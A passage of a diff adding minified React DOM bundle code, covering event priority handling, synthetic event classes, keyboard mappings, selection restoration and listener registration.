+            }
+
+            function vt(e, t, n) {
+                e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - ot(t)] = n
+            }
+
+            function yt(e, t) {
+                var n = e.entangledLanes |= t;
+                for (e = e.entanglements; n;) {
+                    var r = 31 - ot(n),
+                        a = 1 << r;
+                    a & t | e[r] & t && (e[r] |= t), n &= ~a
+                }
+            }
+            var bt = 0;
+
+            function wt(e) {
+                return 1 < (e &= -e) ? 4 < e ? 0 !== (268435455 & e) ? 16 : 536870912 : 4 : 1
+            }
+            var _t, kt, xt, St, Et, jt = !1,
+                Tt = [],
+                Ct = null,
+                Nt = null,
+                Rt = null,
+                Pt = new Map,
+                Ot = new Map,
+                At = [],
+                It = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
+
+            function Lt(e, t) {
+                switch (e) {
+                    case "focusin":
+                    case "focusout":
+                        Ct = null;
+                        break;
+                    case "dragenter":
+                    case "dragleave":
+                        Nt = null;
+                        break;
+                    case "mouseover":
+                    case "mouseout":
+                        Rt = null;
+                        break;
+                    case "pointerover":
+                    case "pointerout":
+                        Pt.delete(t.pointerId);
+                        break;
+                    case "gotpointercapture":
+                    case "lostpointercapture":
+                        Ot.delete(t.pointerId)
+                }
+            }
+
+            function Dt(e, t, n, r, a, s) {
+                return null === e || e.nativeEvent !== s ? (e = {
+                    blockedOn: t,
+                    domEventName: n,
+                    eventSystemFlags: r,
+                    nativeEvent: s,
+                    targetContainers: [a]
+                }, null !== t && (null !== (t = ba(t)) && kt(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== a && -1 === t.indexOf(a) && t.push(a), e)
+            }
+
+            function Ut(e) {
+                var t = ya(e.target);
+                if (null !== t) {
+                    var n = Ve(t);
+                    if (null !== n)
+                        if (13 === (t = n.tag)) {
+                            if (null !== (t = qe(n))) return e.blockedOn = t, void Et(e.priority, function() {
+                                xt(n)
+                            })
+                        } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void(e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null)
+                }
+                e.blockedOn = null
+            }
+
+            function Mt(e) {
+                if (null !== e.blockedOn) return !1;
+                for (var t = e.targetContainers; 0 < t.length;) {
+                    var n = $t(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
+                    if (null !== n) return null !== (t = ba(n)) && kt(t), e.blockedOn = n, !1;
+                    var r = new(n = e.nativeEvent).constructor(n.type, n);
+                    we = r, n.target.dispatchEvent(r), we = null, t.shift()
+                }
+                return !0
+            }
+
+            function zt(e, t, n) {
+                Mt(e) && n.delete(t)
+            }
+
+            function Bt() {
+                jt = !1, null !== Ct && Mt(Ct) && (Ct = null), null !== Nt && Mt(Nt) && (Nt = null), null !== Rt && Mt(Rt) && (Rt = null), Pt.forEach(zt), Ot.forEach(zt)
+            }
+
+            function Ft(e, t) {
+                e.blockedOn === t && (e.blockedOn = null, jt || (jt = !0, a.unstable_scheduleCallback(a.unstable_NormalPriority, Bt)))
+            }
+
+            function Vt(e) {
+                function t(t) {
+                    return Ft(t, e)
+                }
+                if (0 < Tt.length) {
+                    Ft(Tt[0], e);
+                    for (var n = 1; n < Tt.length; n++) {
+                        var r = Tt[n];
+                        r.blockedOn === e && (r.blockedOn = null)
+                    }
+                }
+                for (null !== Ct && Ft(Ct, e), null !== Nt && Ft(Nt, e), null !== Rt && Ft(Rt, e), Pt.forEach(t), Ot.forEach(t), n = 0; n < At.length; n++)(r = At[n]).blockedOn === e && (r.blockedOn = null);
+                for (; 0 < At.length && null === (n = At[0]).blockedOn;) Ut(n), null === n.blockedOn && At.shift()
+            }
+            var qt = w.ReactCurrentBatchConfig,
+                Wt = !0;
+
+            function Ht(e, t, n, r) {
+                var a = bt,
+                    s = qt.transition;
+                qt.transition = null;
+                try {
+                    bt = 1, Gt(e, t, n, r)
+                } finally {
+                    bt = a, qt.transition = s
+                }
+            }
+
+            function Kt(e, t, n, r) {
+                var a = bt,
+                    s = qt.transition;
+                qt.transition = null;
+                try {
+                    bt = 4, Gt(e, t, n, r)
+                } finally {
+                    bt = a, qt.transition = s
+                }
+            }
+
+            function Gt(e, t, n, r) {
+                if (Wt) {
+                    var a = $t(e, t, n, r);
+                    if (null === a) Wr(e, t, r, Jt, n), Lt(e, r);
+                    else if (function(e, t, n, r, a) {
+                            switch (t) {
+                                case "focusin":
+                                    return Ct = Dt(Ct, e, t, n, r, a), !0;
+                                case "dragenter":
+                                    return Nt = Dt(Nt, e, t, n, r, a), !0;
+                                case "mouseover":
+                                    return Rt = Dt(Rt, e, t, n, r, a), !0;
+                                case "pointerover":
+                                    var s = a.pointerId;
+                                    return Pt.set(s, Dt(Pt.get(s) || null, e, t, n, r, a)), !0;
+                                case "gotpointercapture":
+                                    return s = a.pointerId, Ot.set(s, Dt(Ot.get(s) || null, e, t, n, r, a)), !0
+                            }
+                            return !1
+                        }(a, e, t, n, r)) r.stopPropagation();
+                    else if (Lt(e, r), 4 & t && -1 < It.indexOf(e)) {
+                        for (; null !== a;) {
+                            var s = ba(a);
+                            if (null !== s && _t(s), null === (s = $t(e, t, n, r)) && Wr(e, t, r, Jt, n), s === a) break;
+                            a = s
+                        }
+                        null !== a && r.stopPropagation()
+                    } else Wr(e, t, r, null, n)
+                }
+            }
+            var Jt = null;
+
+            function $t(e, t, n, r) {
+                if (Jt = null, null !== (e = ya(e = _e(r))))
+                    if (null === (t = Ve(e))) e = null;
+                    else if (13 === (n = t.tag)) {
+                    if (null !== (e = qe(t))) return e;
+                    e = null
+                } else if (3 === n) {
+                    if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
+                    e = null
+                } else t !== e && (e = null);
+                return Jt = e, null
+            }
+
+            function Qt(e) {
+                switch (e) {
+                    case "cancel":
+                    case "click":
+                    case "close":
+                    case "contextmenu":
+                    case "copy":
+                    case "cut":
+                    case "auxclick":
+                    case "dblclick":
+                    case "dragend":
+                    case "dragstart":
+                    case "drop":
+                    case "focusin":
+                    case "focusout":
+                    case "input":
+                    case "invalid":
+                    case "keydown":
+                    case "keypress":
+                    case "keyup":
+                    case "mousedown":
+                    case "mouseup":
+                    case "paste":
+                    case "pause":
+                    case "play":
+                    case "pointercancel":
+                    case "pointerdown":
+                    case "pointerup":
+                    case "ratechange":
+                    case "reset":
+                    case "resize":
+                    case "seeked":
+                    case "submit":
+                    case "touchcancel":
+                    case "touchend":
+                    case "touchstart":
+                    case "volumechange":
+                    case "change":
+                    case "selectionchange":
+                    case "textInput":
+                    case "compositionstart":
+                    case "compositionend":
+                    case "compositionupdate":
+                    case "beforeblur":
+                    case "afterblur":
+                    case "beforeinput":
+                    case "blur":
+                    case "fullscreenchange":
+                    case "focus":
+                    case "hashchange":
+                    case "popstate":
+                    case "select":
+                    case "selectstart":
+                        return 1;
+                    case "drag":
+                    case "dragenter":
+                    case "dragexit":
+                    case "dragleave":
+                    case "dragover":
+                    case "mousemove":
+                    case "mouseout":
+                    case "mouseover":
+                    case "pointermove":
+                    case "pointerout":
+                    case "pointerover":
+                    case "scroll":
+                    case "toggle":
+                    case "touchmove":
+                    case "wheel":
+                    case "mouseenter":
+                    case "mouseleave":
+                    case "pointerenter":
+                    case "pointerleave":
+                        return 4;
+                    case "message":
+                        switch (Xe()) {
+                            case Ze:
+                                return 1;
+                            case et:
+                                return 4;
+                            case tt:
+                            case nt:
+                                return 16;
+                            case rt:
+                                return 536870912;
+                            default:
+                                return 16
+                        }
+                    default:
+                        return 16
+                }
+            }
+            var Yt = null,
+                Xt = null,
+                Zt = null;
+
+            function en() {
+                if (Zt) return Zt;
+                var e, t, n = Xt,
+                    r = n.length,
+                    a = "value" in Yt ? Yt.value : Yt.textContent,
+                    s = a.length;
+                for (e = 0; e < r && n[e] === a[e]; e++);
+                var o = r - e;
+                for (t = 1; t <= o && n[r - t] === a[s - t]; t++);
+                return Zt = a.slice(e, 1 < t ? 1 - t : void 0)
+            }
+
+            function tn(e) {
+                var t = e.keyCode;
+                return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0
+            }
+
+            function nn() {
+                return !0
+            }
+
+            function rn() {
+                return !1
+            }
+
+            function an(e) {
+                function t(t, n, r, a, s) {
+                    for (var o in this._reactName = t, this._targetInst = r, this.type = n, this.nativeEvent = a, this.target = s, this.currentTarget = null, e)
+                        if (e.hasOwnProperty(o)) {
+                            t = e[o], this[o] = t ? t(a) : a[o]
+                        }
+                    return this.isDefaultPrevented = (null != a.defaultPrevented ? a.defaultPrevented : !1 === a.returnValue) ? nn : rn, this.isPropagationStopped = rn, this
+                }
+                return U(t.prototype, {
+                    preventDefault: function() {
+                        this.defaultPrevented = !0;
+                        var e = this.nativeEvent;
+                        e && (e.preventDefault ? e.preventDefault() : "unknown" !== typeof e.returnValue && (e.returnValue = !1), this.isDefaultPrevented = nn)
+                    },
+                    stopPropagation: function() {
+                        var e = this.nativeEvent;
+                        e && (e.stopPropagation ? e.stopPropagation() : "unknown" !== typeof e.cancelBubble && (e.cancelBubble = !0), this.isPropagationStopped = nn)
+                    },
+                    persist: function() {},
+                    isPersistent: nn
+                }), t
+            }
+            var sn, on, ln, cn = {
+                    eventPhase: 0,
+                    bubbles: 0,
+                    cancelable: 0,
+                    timeStamp: function(e) {
+                        return e.timeStamp || Date.now()
+                    },
+                    defaultPrevented: 0,
+                    isTrusted: 0
+                },
+                un = an(cn),
+                dn = U({}, cn, {
+                    view: 0,
+                    detail: 0
+                }),
+                hn = an(dn),
+                fn = U({}, dn, {
+                    screenX: 0,
+                    screenY: 0,
+                    clientX: 0,
+                    clientY: 0,
+                    pageX: 0,
+                    pageY: 0,
+                    ctrlKey: 0,
+                    shiftKey: 0,
+                    altKey: 0,
+                    metaKey: 0,
+                    getModifierState: En,
+                    button: 0,
+                    buttons: 0,
+                    relatedTarget: function(e) {
+                        return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
+                    },
+                    movementX: function(e) {
+                        return "movementX" in e ? e.movementX : (e !== ln && (ln && "mousemove" === e.type ? (sn = e.screenX - ln.screenX, on = e.screenY - ln.screenY) : on = sn = 0, ln = e), sn)
+                    },
+                    movementY: function(e) {
+                        return "movementY" in e ? e.movementY : on
+                    }
+                }),
+                pn = an(fn),
+                mn = an(U({}, fn, {
+                    dataTransfer: 0
+                })),
+                gn = an(U({}, dn, {
+                    relatedTarget: 0
+                })),
+                vn = an(U({}, cn, {
+                    animationName: 0,
+                    elapsedTime: 0,
+                    pseudoElement: 0
+                })),
+                yn = U({}, cn, {
+                    clipboardData: function(e) {
+                        return "clipboardData" in e ? e.clipboardData : window.clipboardData
+                    }
+                }),
+                bn = an(yn),
+                wn = an(U({}, cn, {
+                    data: 0
+                })),
+                _n = {
+                    Esc: "Escape",
+                    Spacebar: " ",
+                    Left: "ArrowLeft",
+                    Up: "ArrowUp",
+                    Right: "ArrowRight",
+                    Down: "ArrowDown",
+                    Del: "Delete",
+                    Win: "OS",
+                    Menu: "ContextMenu",
+                    Apps: "ContextMenu",
+                    Scroll: "ScrollLock",
+                    MozPrintableKey: "Unidentified"
+                },
+                kn = {
+                    8: "Backspace",
+                    9: "Tab",
+                    12: "Clear",
+                    13: "Enter",
+                    16: "Shift",
+                    17: "Control",
+                    18: "Alt",
+                    19: "Pause",
+                    20: "CapsLock",
+                    27: "Escape",
+                    32: " ",
+                    33: "PageUp",
+                    34: "PageDown",
+                    35: "End",
+                    36: "Home",
+                    37: "ArrowLeft",
+                    38: "ArrowUp",
+                    39: "ArrowRight",
+                    40: "ArrowDown",
+                    45: "Insert",
+                    46: "Delete",
+                    112: "F1",
+                    113: "F2",
+                    114: "F3",
+                    115: "F4",
+                    116: "F5",
+                    117: "F6",
+                    118: "F7",
+                    119: "F8",
+                    120: "F9",
+                    121: "F10",
+                    122: "F11",
+                    123: "F12",
+                    144: "NumLock",
+                    145: "ScrollLock",
+                    224: "Meta"
+                },
+                xn = {
+                    Alt: "altKey",
+                    Control: "ctrlKey",
+                    Meta: "metaKey",
+                    Shift: "shiftKey"
+                };
+
+            function Sn(e) {
+                var t = this.nativeEvent;
+                return t.getModifierState ? t.getModifierState(e) : !!(e = xn[e]) && !!t[e]
+            }
+
+            function En() {
+                return Sn
+            }
+            var jn = U({}, dn, {
+                    key: function(e) {
+                        if (e.key) {
+                            var t = _n[e.key] || e.key;
+                            if ("Unidentified" !== t) return t
+                        }
+                        return "keypress" === e.type ? 13 === (e = tn(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? kn[e.keyCode] || "Unidentified" : ""
+                    },
+                    code: 0,
+                    location: 0,
+                    ctrlKey: 0,
+                    shiftKey: 0,
+                    altKey: 0,
+                    metaKey: 0,
+                    repeat: 0,
+                    locale: 0,
+                    getModifierState: En,
+                    charCode: function(e) {
+                        return "keypress" === e.type ? tn(e) : 0
+                    },
+                    keyCode: function(e) {
+                        return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
+                    },
+                    which: function(e) {
+                        return "keypress" === e.type ? tn(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
+                    }
+                }),
+                Tn = an(jn),
+                Cn = an(U({}, fn, {
+                    pointerId: 0,
+                    width: 0,
+                    height: 0,
+                    pressure: 0,
+                    tangentialPressure: 0,
+                    tiltX: 0,
+                    tiltY: 0,
+                    twist: 0,
+                    pointerType: 0,
+                    isPrimary: 0
+                })),
+                Nn = an(U({}, dn, {
+                    touches: 0,
+                    targetTouches: 0,
+                    changedTouches: 0,
+                    altKey: 0,
+                    metaKey: 0,
+                    ctrlKey: 0,
+                    shiftKey: 0,
+                    getModifierState: En
+                })),
+                Rn = an(U({}, cn, {
+                    propertyName: 0,
+                    elapsedTime: 0,
+                    pseudoElement: 0
+                })),
+                Pn = U({}, fn, {
+                    deltaX: function(e) {
+                        return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
+                    },
+                    deltaY: function(e) {
+                        return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
+                    },
+                    deltaZ: 0,
+                    deltaMode: 0
+                }),
+                On = an(Pn),
+                An = [9, 13, 27, 32],
+                In = u && "CompositionEvent" in window,
+                Ln = null;
+            u && "documentMode" in document && (Ln = document.documentMode);
+            var Dn = u && "TextEvent" in window && !Ln,
+                Un = u && (!In || Ln && 8 < Ln && 11 >= Ln),
+                Mn = String.fromCharCode(32),
+                zn = !1;
+
+            function Bn(e, t) {
+                switch (e) {
+                    case "keyup":
+                        return -1 !== An.indexOf(t.keyCode);
+                    case "keydown":
+                        return 229 !== t.keyCode;
+                    case "keypress":
+                    case "mousedown":
+                    case "focusout":
+                        return !0;
+                    default:
+                        return !1
+                }
+            }
+
+            function Fn(e) {
+                return "object" === typeof(e = e.detail) && "data" in e ? e.data : null
+            }
+            var Vn = !1;
+            var qn = {
+                color: !0,
+                date: !0,
+                datetime: !0,
+                "datetime-local": !0,
+                email: !0,
+                month: !0,
+                number: !0,
+                password: !0,
+                range: !0,
+                search: !0,
+                tel: !0,
+                text: !0,
+                time: !0,
+                url: !0,
+                week: !0
+            };
+
+            function Wn(e) {
+                var t = e && e.nodeName && e.nodeName.toLowerCase();
+                return "input" === t ? !!qn[e.type] : "textarea" === t
+            }
+
+            function Hn(e, t, n, r) {
+                je(r), 0 < (t = Kr(t, "onChange")).length && (n = new un("onChange", "change", null, n, r), e.push({
+                    event: n,
+                    listeners: t
+                }))
+            }
+            var Kn = null,
+                Gn = null;
+
+            function Jn(e) {
+                Mr(e, 0)
+            }
+
+            function $n(e) {
+                if (G(wa(e))) return e
+            }
+
+            function Qn(e, t) {
+                if ("change" === e) return t
+            }
+            var Yn = !1;
+            if (u) {
+                var Xn;
+                if (u) {
+                    var Zn = "oninput" in document;
+                    if (!Zn) {
+                        var er = document.createElement("div");
+                        er.setAttribute("oninput", "return;"), Zn = "function" === typeof er.oninput
+                    }
+                    Xn = Zn
+                } else Xn = !1;
+                Yn = Xn && (!document.documentMode || 9 < document.documentMode)
+            }
+
+            function tr() {
+                Kn && (Kn.detachEvent("onpropertychange", nr), Gn = Kn = null)
+            }
+
+            function nr(e) {
+                if ("value" === e.propertyName && $n(Gn)) {
+                    var t = [];
+                    Hn(t, Gn, e, _e(e)), Pe(Jn, t)
+                }
+            }
+
+            function rr(e, t, n) {
+                "focusin" === e ? (tr(), Gn = n, (Kn = t).attachEvent("onpropertychange", nr)) : "focusout" === e && tr()
+            }
+
+            function ar(e) {
+                if ("selectionchange" === e || "keyup" === e || "keydown" === e) return $n(Gn)
+            }
+
+            function sr(e, t) {
+                if ("click" === e) return $n(t)
+            }
+
+            function or(e, t) {
+                if ("input" === e || "change" === e) return $n(t)
+            }
+            var ir = "function" === typeof Object.is ? Object.is : function(e, t) {
+                return e === t && (0 !== e || 1 / e === 1 / t) || e !== e && t !== t
+            };
+
+            function lr(e, t) {
+                if (ir(e, t)) return !0;
+                if ("object" !== typeof e || null === e || "object" !== typeof t || null === t) return !1;
+                var n = Object.keys(e),
+                    r = Object.keys(t);
+                if (n.length !== r.length) return !1;
+                for (r = 0; r < n.length; r++) {
+                    var a = n[r];
+                    if (!d.call(t, a) || !ir(e[a], t[a])) return !1
+                }
+                return !0
+            }
+
+            function cr(e) {
+                for (; e && e.firstChild;) e = e.firstChild;
+                return e
+            }
+
+            function ur(e, t) {
+                var n, r = cr(e);
+                for (e = 0; r;) {
+                    if (3 === r.nodeType) {
+                        if (n = e + r.textContent.length, e <= t && n >= t) return {
+                            node: r,
+                            offset: t - e
+                        };
+                        e = n
+                    }
+                    e: {
+                        for (; r;) {
+                            if (r.nextSibling) {
+                                r = r.nextSibling;
+                                break e
+                            }
+                            r = r.parentNode
+                        }
+                        r = void 0
+                    }
+                    r = cr(r)
+                }
+            }
+
+            function dr(e, t) {
+                return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? dr(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))))
+            }
+
+            function hr() {
+                for (var e = window, t = J(); t instanceof e.HTMLIFrameElement;) {
+                    try {
+                        var n = "string" === typeof t.contentWindow.location.href
+                    } catch (r) {
+                        n = !1
+                    }
+                    if (!n) break;
+                    t = J((e = t.contentWindow).document)
+                }
+                return t
+            }
+
+            function fr(e) {
+                var t = e && e.nodeName && e.nodeName.toLowerCase();
+                return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable)
+            }
+
+            function pr(e) {
+                var t = hr(),
+                    n = e.focusedElem,
+                    r = e.selectionRange;
+                if (t !== n && n && n.ownerDocument && dr(n.ownerDocument.documentElement, n)) {
+                    if (null !== r && fr(n))
+                        if (t = r.start, void 0 === (e = r.end) && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
+                        else if ((e = (t = n.ownerDocument || document) && t.defaultView || window).getSelection) {
+                        e = e.getSelection();
+                        var a = n.textContent.length,
+                            s = Math.min(r.start, a);
+                        r = void 0 === r.end ? s : Math.min(r.end, a), !e.extend && s > r && (a = r, r = s, s = a), a = ur(n, s);
+                        var o = ur(n, r);
+                        a && o && (1 !== e.rangeCount || e.anchorNode !== a.node || e.anchorOffset !== a.offset || e.focusNode !== o.node || e.focusOffset !== o.offset) && ((t = t.createRange()).setStart(a.node, a.offset), e.removeAllRanges(), s > r ? (e.addRange(t), e.extend(o.node, o.offset)) : (t.setEnd(o.node, o.offset), e.addRange(t)))
+                    }
+                    for (t = [], e = n; e = e.parentNode;) 1 === e.nodeType && t.push({
+                        element: e,
+                        left: e.scrollLeft,
+                        top: e.scrollTop
+                    });
+                    for ("function" === typeof n.focus && n.focus(), n = 0; n < t.length; n++)(e = t[n]).element.scrollLeft = e.left, e.element.scrollTop = e.top
+                }
+            }
+            var mr = u && "documentMode" in document && 11 >= document.documentMode,
+                gr = null,
+                vr = null,
+                yr = null,
+                br = !1;
+
+            function wr(e, t, n) {
+                var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
+                br || null == gr || gr !== J(r) || ("selectionStart" in (r = gr) && fr(r) ? r = {
+                    start: r.selectionStart,
+                    end: r.selectionEnd
+                } : r = {
+                    anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
+                    anchorOffset: r.anchorOffset,
+                    focusNode: r.focusNode,
+                    focusOffset: r.focusOffset
+                }, yr && lr(yr, r) || (yr = r, 0 < (r = Kr(vr, "onSelect")).length && (t = new un("onSelect", "select", null, t, n), e.push({
+                    event: t,
+                    listeners: r
+                }), t.target = gr)))
+            }
+
+            function _r(e, t) {
+                var n = {};
+                return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
+            }
+            var kr = {
+                    animationend: _r("Animation", "AnimationEnd"),
+                    animationiteration: _r("Animation", "AnimationIteration"),
+                    animationstart: _r("Animation", "AnimationStart"),
+                    transitionend: _r("Transition", "TransitionEnd")
+                },
+                xr = {},
+                Sr = {};
+
+            function Er(e) {
+                if (xr[e]) return xr[e];
+                if (!kr[e]) return e;
+                var t, n = kr[e];
+                for (t in n)
+                    if (n.hasOwnProperty(t) && t in Sr) return xr[e] = n[t];
+                return e
+            }
+            u && (Sr = document.createElement("div").style, "AnimationEvent" in window || (delete kr.animationend.animation, delete kr.animationiteration.animation, delete kr.animationstart.animation), "TransitionEvent" in window || delete kr.transitionend.transition);
+            var jr = Er("animationend"),
+                Tr = Er("animationiteration"),
+                Cr = Er("animationstart"),
+                Nr = Er("transitionend"),
+                Rr = new Map,
+                Pr = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
+
+            function Or(e, t) {
+                Rr.set(e, t), l(t, [e])
+            }
+            for (var Ar = 0; Ar < Pr.length; Ar++) {
+                var Ir = Pr[Ar];
+                Or(Ir.toLowerCase(), "on" + (Ir[0].toUpperCase() + Ir.slice(1)))
+            }
+            Or(jr, "onAnimationEnd"), Or(Tr, "onAnimationIteration"), Or(Cr, "onAnimationStart"), Or("dblclick", "onDoubleClick"), Or("focusin", "onFocus"), Or("focusout", "onBlur"), Or(Nr, "onTransitionEnd"), c("onMouseEnter", ["mouseout", "mouseover"]), c("onMouseLeave", ["mouseout", "mouseover"]), c("onPointerEnter", ["pointerout", "pointerover"]), c("onPointerLeave", ["pointerout", "pointerover"]), l("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")), l("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")), l("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]), l("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")), l("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")), l("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
+            var Lr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
+                Dr = new Set("cancel close invalid load scroll toggle".split(" ").concat(Lr));
+
+            function Ur(e, t, n) {
+                var r = e.type || "unknown-event";
+                e.currentTarget = n, function(e, t, n, r, a, o, i, l, c) {
+                    if (Fe.apply(this, arguments), De) {
+                        if (!De) throw Error(s(198));
+                        var u = Ue;
+                        De = !1, Ue = null, Me || (Me = !0, ze = u)
+                    }
+                }(r, t, void 0, e), e.currentTarget = null
+            }
+
+            function Mr(e, t) {
+                t = 0 !== (4 & t);
+                for (var n = 0; n < e.length; n++) {
+                    var r = e[n],
+                        a = r.event;
+                    r = r.listeners;
+                    e: {
+                        var s = void 0;
+                        if (t)
+                            for (var o = r.length - 1; 0 <= o; o--) {
+                                var i = r[o],
+                                    l = i.instance,
+                                    c = i.currentTarget;
+                                if (i = i.listener, l !== s && a.isPropagationStopped()) break e;
+                                Ur(a, i, c), s = l
+                            } else
+                                for (o = 0; o < r.length; o++) {
+                                    if (l = (i = r[o]).instance, c = i.currentTarget, i = i.listener, l !== s && a.isPropagationStopped()) break e;
+                                    Ur(a, i, c), s = l
+                                }
+                    }
+                }
+                if (Me) throw e = ze, Me = !1, ze = null, e
+            }
+
+            function zr(e, t) {
+                var n = t[ma];
+                void 0 === n && (n = t[ma] = new Set);
+                var r = e + "__bubble";
+                n.has(r) || (qr(t, e, 2, !1), n.add(r))
+            }
+
+            function Br(e, t, n) {
+                var r = 0;
+                t && (r |= 4), qr(n, e, r, t)
+            }
+            var Fr = "_reactListening" + Math.random().toString(36).slice(2);
+
+            function Vr(e) {
+                if (!e[Fr]) {
+                    e[Fr] = !0, o.forEach((function(t) {
+                        "selectionchange" !== t && (Dr.has(t) || Br(t, !1, e), Br(t, !0, e))
+                    }));
+                    var t = 9 === e.nodeType ? e : e.ownerDocument;
+                    null === t || t[Fr] || (t[Fr] = !0, Br("selectionchange", !1, t))
+                }
+            }
+
+            function qr(e, t, n, r) {
+                switch (Qt(t)) {
+                    case 1:
+                        var a = Ht;
+                        break;
+                    case 4:
+                        a = Kt;
+                        break;
+                    default:
+                        a = Gt
+                }
+                n = a.bind(null, t, n, e), a = void 0, !Ae || "touchstart" !== t && "touchmove" !== t && "wheel" !== t || (a = !0), r ? void 0 !== a ? e.addEventListener(t, n, {
+                    capture: !0,
+                    passive: a
+                }) : e.addEventListener(t, n, !0) : void 0 !== a ? e.addEventListener(t, n, {
+                    passive: a
+                }) : e.addEventListener(t, n, !1)
+            }
+
+            function Wr(e, t, n, r, a) {
+                var s = r;
+                if (0 === (1 & t) && 0 === (2 & t) && null !== r) e: for (;;) {
+                    if (null === r) return;
+                    var o = r.tag;
+                    if (3 === o || 4 === o) {
+                        var i = r.stateNode.containerInfo;
+                        if (i === a || 8 === i.nodeType && i.parentNode === a) break;
+                        if (4 === o)
+                            for (o = r.return; null !== o;) {
+                                var l = o.tag;
+                                if ((3 === l || 4 === l) && ((l = o.stateNode.containerInfo) === a || 8 === l.nodeType && l.parentNode === a)) return;
+                                o = o.return
+                            }
+                        for (; null !== i;) {
+                            if (null === (o = ya(i))) return;
+                            if (5 === (l = o.tag) || 6 === l) {
+                                r = s = o;
+                                continue e
+                            }
+                            i = i.parentNode
+                        }
+                    }
+                    r = r.return
+                }
+                Pe((function() {
+                    var r = s,
+                        a = _e(n),
+                        o = [];
+                    e: {
+                        var i = Rr.get(e);
+                        if (void 0 !== i) {
+                            var l = un,
+                                c = e;
+                            switch (e) {
+                                case "keypress":
+                                    if (0 === tn(n)) break e;
+                                case "keydown":
+                                case "keyup":
+                                    l = Tn;
+                                    break;
+                                case "focusin":
+                                    c = "focus", l = gn;
+                                    break;
+                                case "focusout":
+                                    c = "blur", l = gn;
+                                    break;
+                                case "beforeblur":
+                                case "afterblur":
+                                    l = gn;
+                                    break;
+                                case "click":
+                                    if (2 === n.button) break e;
+                                case "auxclick":
+                                case "dblclick":
+                                case "mousedown":
+                                case "mousemove":
+                                case "mouseup":
+                                case "mouseout":
+                                case "mouseover":
+                                case "contextmenu":
+                                    l = pn;
+                                    break;
+                                case "drag":
+                                case "dragend":
+                                case "dragenter":
+                                case "dragexit":
+                                case "dragleave":
+                                case "dragover":
+                                case "dragstart":
+                                case "drop":
+                                    l = mn;
+                                    break;
+                                case "touchcancel":
+                                case "touchend":
+                                case "touchmove":
+                                case "touchstart":
+                                    l = Nn;
+                                    break;
+                                case jr:
+                                case Tr:
+                                case Cr:
+                                    l = vn;
+                                    break;
+                                case Nr:
+                                    l = Rn;
+                                    break;
+                                case "scroll":
+                                    l = hn;
+                                    break;
+                                case "wheel":
+                                    l = On;
+                                    break;
+                                case "copy":
+                                case "cut":
+                                case "paste":
+                                    l = bn;
+                                    break;
+                                case "gotpointercapture":
+                                case "lostpointercapture":
+                                case "pointercancel":
+                                case "pointerdown":
+                                case "pointermove":
+                                case "pointerout":
+                                case "pointerover":
+                                case "pointerup":
+                                    l = Cn
+                            }
+                            var u = 0 !== (4 & t),
+                                d = !u && "scroll" === e,
+                                h = u ? null !== i ? i + "Capture" : null : i;
+                            u = [];
+                            for (var f, p = r; null !== p;) {
+                                var m = (f = p).stateNode;
+                                if (5 === f.tag && null !== m && (f = m, null !== h && (null != (m = Oe(p, h)) && u.push(Hr(p, m, f)))), d) break;
+                                p = p.return
+                            }
+                            0 < u.length && (i = new l(i, c, null, n, a), o.push({
+                                event: i,
+                                listeners: u
+                            }))
+                        }
+                    }
+                    if (0 === (7 & t)) {
